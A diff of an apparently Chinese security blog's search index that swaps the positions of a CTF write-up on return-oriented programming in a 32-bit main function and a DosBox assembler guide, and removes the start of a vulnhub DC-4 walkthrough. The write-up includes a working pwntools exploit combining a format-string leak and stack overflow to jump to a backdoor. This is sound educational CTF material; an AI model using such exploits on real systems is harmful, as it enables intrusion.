@@ -1165,53 +1165,45 @@
       </tags>
   </entry>
   <entry>
-    <title>DosBox 的使用方法</title>
-    <url>//DosBox.html</url>
-    <content><![CDATA[<p>Windows下<code>DosBox</code>的使用方法</p>
+    <title>main函数的ROP问题</title>
+    <url>//main_rop.html</url>
+    <content><![CDATA[<p>示例：安恒7月月赛签到题</p>
+<p><strong>本文主要探讨的是main函数的ROP问题，不是题解（</strong></p>
 <a id="more"></a>
 
-<h1 id="DosBox-使用方法"><a href="#DosBox-使用方法" class="headerlink" title="DosBox 使用方法"></a>DosBox 使用方法</h1><h2 id="常用程序"><a href="#常用程序" class="headerlink" title="常用程序"></a>常用程序</h2><ul>
-<li>masm</li>
-<li>link</li>
-<li>debug</li>
-</ul>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
-<li>挂载盘符<ul>
-<li>使用命令 <code>mount desk location</code>,其中desk 是虚拟盘符命，可以自己命名，location可以是一个盘( C D E)，也可以是一个文件夹<ul>
-<li>例如我想挂载的路径为 <code>E:\asm\dosbox-0.74\tools</code>，并命名为X盘，则输入命令<code>mount x E:\asm\dosbox-0.74\tools</code>，这个时候就把X盘（虚构的）绑定到了这个目录下面，然后输入<code>x:</code>进入该目录，如下图所示</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/1.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/1-300x59.png"></a></p>
-<ul>
-<li>这里推荐把盘符挂载到<strong>masm.exe</strong>所在的目录，为了以后使用方便</li>
-</ul>
-<h2 id="masm-exe"><a href="#masm-exe" class="headerlink" title="masm.exe"></a>masm.exe</h2><p>是编译程序，用来编译汇编文件，编译完成之后会产生一个<code>.obj</code>文件</p>
-<p>输入命令<code>masm *.asm</code>,这里的*是指你的文件名称，例如<code>masm 2.asm</code>，如果你的程序没有错误的话，那么就会变成这样</p>
-<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/2.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/2-300x52.png"></a></p>
-<p>要求输入的是obj文件的名字，如果想和asm文件的名称一样就直接回车跳过，或者使用<code>masm 2.asm;</code>，即加入一个 <code>;</code>，<br><a href="http://49.234.181.139/wp-content/uploads/2019/12/4.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/4-300x161.png"></a></p>
-<p>两种方法结果如图所示</p>
-<h2 id="link-exe"><a href="#link-exe" class="headerlink" title="link.exe"></a>link.exe</h2><p>link是用来将obj文件链接成exe文件的工具，运行完之后，如果没有错误，会产生一个exe文件</p>
-<p><code>link *.obj</code> 这个* 也是文件名的样子，运行结果如下</p>
-<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/3.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/3-300x195.png"></a></p>
-<p>也是可以加入<code>;</code>的</p>
-<p>链接完之后产生的exe就是可执行文件了，输入<code>*.exe</code>可以直接运行</p>
-<h2 id="debug-exe"><a href="#debug-exe" class="headerlink" title="debug.exe"></a>debug.exe</h2><p>debug.exe是调试用的工具，</p>
-<p><code>debug [filename]</code> filename是一个可选参数，如果不给出的话，就会进入一般的debug界面(与windows XP的debug一样)，如果给出filename 则会调试这个程序</p>
-<p>例如 <code>debug 2.exe</code></p>
-<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/5.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/5.png"></a></p>
-<p>然后就可以使用debug的命令去调试</p>
-<h3 id="debug命令"><a href="#debug命令" class="headerlink" title="debug命令"></a>debug命令</h3><p><a href="https://jingyan.baidu.com/article/a65957f433f60924e67f9b07.html">百度经验</a> </p>
-<p><a href="%5Bhttps://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin%5D(https://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin)">百度百科</a></p>
-<h1 id="FIN"><a href="#FIN" class="headerlink" title="FIN"></a>FIN</h1><h2 id="ps-有啥不懂的问WXR就完事了"><a href="#ps-有啥不懂的问WXR就完事了" class="headerlink" title="ps:有啥不懂的问WXR就完事了"></a>ps:有啥不懂的问WXR就完事了</h2>]]></content>
+
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>伪C代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞点很明显存在<strong>格式化字符串以及栈溢出</strong></p>
+<h2 id="main函数的开头结尾"><a href="#main函数的开头结尾" class="headerlink" title="main函数的开头结尾"></a>main函数的开头结尾</h2><p>对于main函数的ROP相比于其他函数有很大的不一样，最重要的地方就是最前和最后那几条语句</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure>
+
+<h4 id="对应的栈帧"><a href="#对应的栈帧" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx</span><br></pre></td></tr></table></figure>
+
+<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>由于在<code>call main</code>的时候，<code>esp</code>指向的就是<code>main的ret</code>也就是<code>__libc_start_main+offset</code>的位置，然后<code>lea ecx, [esp-4]</code>使得<code>ecx</code>指向了<code>ret</code>之后的一个地址。然后经过<code>and esp, 0xfffffff0</code>之后，<code>esp</code>向上变化了一定的空间，又通过<code>push ecx</code>起到了保存的作用</p>
+<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><h4 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<h4 id="对应的栈帧-1"><a href="#对应的栈帧-1" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+		</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure>
+
+<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>main函数返回的时候，会先把<code>ebp-4</code>里面保存的<code>原ecx</code>寄存器的值还原，然后根据这个<code>ecx</code>的值，找到真正的<code>ret</code></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为ROP需要劫持返回地址，那么在不知道原<code>ecx</code>值的情况下是无法真正劫持<code>ret</code>的，所以给了一个格式化字符串泄漏栈内的值，在泄漏了值之后就变得简单了</p>
+<h3 id="附上exp"><a href="#附上exp" class="headerlink" title="附上exp"></a>附上exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
         <category>pwn</category>
+        <category>ROP</category>
       </categories>
       <tags>
         <tag>pwn</tag>
-        <tag>dosbox</tag>
+        <tag>ROP</tag>
       </tags>
   </entry>
   <entry>
@@ -1289,45 +1281,53 @@
       </tags>
   </entry>
   <entry>
-    <title>main函数的ROP问题</title>
-    <url>//main_rop.html</url>
-    <content><![CDATA[<p>示例：安恒7月月赛签到题</p>
-<p><strong>本文主要探讨的是main函数的ROP问题，不是题解（</strong></p>
+    <title>DosBox 的使用方法</title>
+    <url>//DosBox.html</url>
+    <content><![CDATA[<p>Windows下<code>DosBox</code>的使用方法</p>
 <a id="more"></a>
 
-
-
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>伪C代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure>
-
-
-
-<p>漏洞点很明显存在<strong>格式化字符串以及栈溢出</strong></p>
-<h2 id="main函数的开头结尾"><a href="#main函数的开头结尾" class="headerlink" title="main函数的开头结尾"></a>main函数的开头结尾</h2><p>对于main函数的ROP相比于其他函数有很大的不一样，最重要的地方就是最前和最后那几条语句</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure>
-
-<h4 id="对应的栈帧"><a href="#对应的栈帧" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx</span><br></pre></td></tr></table></figure>
-
-<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>由于在<code>call main</code>的时候，<code>esp</code>指向的就是<code>main的ret</code>也就是<code>__libc_start_main+offset</code>的位置，然后<code>lea ecx, [esp-4]</code>使得<code>ecx</code>指向了<code>ret</code>之后的一个地址。然后经过<code>and esp, 0xfffffff0</code>之后，<code>esp</code>向上变化了一定的空间，又通过<code>push ecx</code>起到了保存的作用</p>
-<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><h4 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
-
-<h4 id="对应的栈帧-1"><a href="#对应的栈帧-1" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+		</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure>
-
-<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>main函数返回的时候，会先把<code>ebp-4</code>里面保存的<code>原ecx</code>寄存器的值还原，然后根据这个<code>ecx</code>的值，找到真正的<code>ret</code></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为ROP需要劫持返回地址，那么在不知道原<code>ecx</code>值的情况下是无法真正劫持<code>ret</code>的，所以给了一个格式化字符串泄漏栈内的值，在泄漏了值之后就变得简单了</p>
-<h3 id="附上exp"><a href="#附上exp" class="headerlink" title="附上exp"></a>附上exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
+<h1 id="DosBox-使用方法"><a href="#DosBox-使用方法" class="headerlink" title="DosBox 使用方法"></a>DosBox 使用方法</h1><h2 id="常用程序"><a href="#常用程序" class="headerlink" title="常用程序"></a>常用程序</h2><ul>
+<li>masm</li>
+<li>link</li>
+<li>debug</li>
+</ul>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
+<li>挂载盘符<ul>
+<li>使用命令 <code>mount desk location</code>,其中desk 是虚拟盘符命，可以自己命名，location可以是一个盘( C D E)，也可以是一个文件夹<ul>
+<li>例如我想挂载的路径为 <code>E:\asm\dosbox-0.74\tools</code>，并命名为X盘，则输入命令<code>mount x E:\asm\dosbox-0.74\tools</code>，这个时候就把X盘（虚构的）绑定到了这个目录下面，然后输入<code>x:</code>进入该目录，如下图所示</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/1.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/1-300x59.png"></a></p>
+<ul>
+<li>这里推荐把盘符挂载到<strong>masm.exe</strong>所在的目录，为了以后使用方便</li>
+</ul>
+<h2 id="masm-exe"><a href="#masm-exe" class="headerlink" title="masm.exe"></a>masm.exe</h2><p>是编译程序，用来编译汇编文件，编译完成之后会产生一个<code>.obj</code>文件</p>
+<p>输入命令<code>masm *.asm</code>,这里的*是指你的文件名称，例如<code>masm 2.asm</code>，如果你的程序没有错误的话，那么就会变成这样</p>
+<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/2.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/2-300x52.png"></a></p>
+<p>要求输入的是obj文件的名字，如果想和asm文件的名称一样就直接回车跳过，或者使用<code>masm 2.asm;</code>，即加入一个 <code>;</code>，<br><a href="http://49.234.181.139/wp-content/uploads/2019/12/4.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/4-300x161.png"></a></p>
+<p>两种方法结果如图所示</p>
+<h2 id="link-exe"><a href="#link-exe" class="headerlink" title="link.exe"></a>link.exe</h2><p>link是用来将obj文件链接成exe文件的工具，运行完之后，如果没有错误，会产生一个exe文件</p>
+<p><code>link *.obj</code> 这个* 也是文件名的样子，运行结果如下</p>
+<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/3.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/3-300x195.png"></a></p>
+<p>也是可以加入<code>;</code>的</p>
+<p>链接完之后产生的exe就是可执行文件了，输入<code>*.exe</code>可以直接运行</p>
+<h2 id="debug-exe"><a href="#debug-exe" class="headerlink" title="debug.exe"></a>debug.exe</h2><p>debug.exe是调试用的工具，</p>
+<p><code>debug [filename]</code> filename是一个可选参数，如果不给出的话，就会进入一般的debug界面(与windows XP的debug一样)，如果给出filename 则会调试这个程序</p>
+<p>例如 <code>debug 2.exe</code></p>
+<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/5.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/5.png"></a></p>
+<p>然后就可以使用debug的命令去调试</p>
+<h3 id="debug命令"><a href="#debug命令" class="headerlink" title="debug命令"></a>debug命令</h3><p><a href="https://jingyan.baidu.com/article/a65957f433f60924e67f9b07.html">百度经验</a> </p>
+<p><a href="%5Bhttps://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin%5D(https://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin)">百度百科</a></p>
+<h1 id="FIN"><a href="#FIN" class="headerlink" title="FIN"></a>FIN</h1><h2 id="ps-有啥不懂的问WXR就完事了"><a href="#ps-有啥不懂的问WXR就完事了" class="headerlink" title="ps:有啥不懂的问WXR就完事了"></a>ps:有啥不懂的问WXR就完事了</h2>]]></content>
       <categories>
         <category>pwn</category>
-        <category>ROP</category>
       </categories>
       <tags>
         <tag>pwn</tag>
-        <tag>ROP</tag>
+        <tag>dosbox</tag>
       </tags>
   </entry>
   <entry>
@@ -1929,54 +1929,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub DC-4靶机</title>
-    <url>//DC-4.html</url>
-    <content><![CDATA[<p>vulnhub里的 DC-4 靶机</p>
-<p>初学者难度</p>
-<a id="more"></a>
-
-<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP地址"><a href="#NMAP扫描得到IP地址" class="headerlink" title="NMAP扫描得到IP地址"></a>NMAP扫描得到IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
-<p>主机发现,ip地址为<code>192.168.147.133</code>,进行详细的扫描</p>
